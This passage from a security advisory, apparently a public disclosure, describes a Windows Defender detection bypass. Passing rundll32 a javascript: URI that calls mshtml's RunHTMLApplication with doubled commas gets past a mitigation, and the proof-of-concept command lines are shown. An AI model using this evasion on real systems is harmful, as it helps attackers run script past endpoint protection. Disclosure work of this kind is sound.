Attempts at execution fail\nand attackers will typically get an \"Access is denied\" error message.\n\nBack in 2022, I disclosed how that could be easily bypassed by passing an extra path traversal when referencing mshtml but since has been mitigated.\nHowever, I discovered using multi-commas \",\" will bypass that mitigation and successfully execute as of the time of this writing.\n\n\n[References]\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt\n\n\n[Exploit/POC]\nOpen command prompt as Administator.\n\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,RunHTMLApplication \";alert(666)\nAccess is denied.\n\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,,RunHTMLApplication \";alert(666)\n\nMulti-commas, for the Win!\n\n\n[Network Access]\nLocal\n\n\n[Severity]\nHigh\n\n\n[Disclosure Timeline]\nFebruary 7, 2024: Public Disclosure\n\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given.
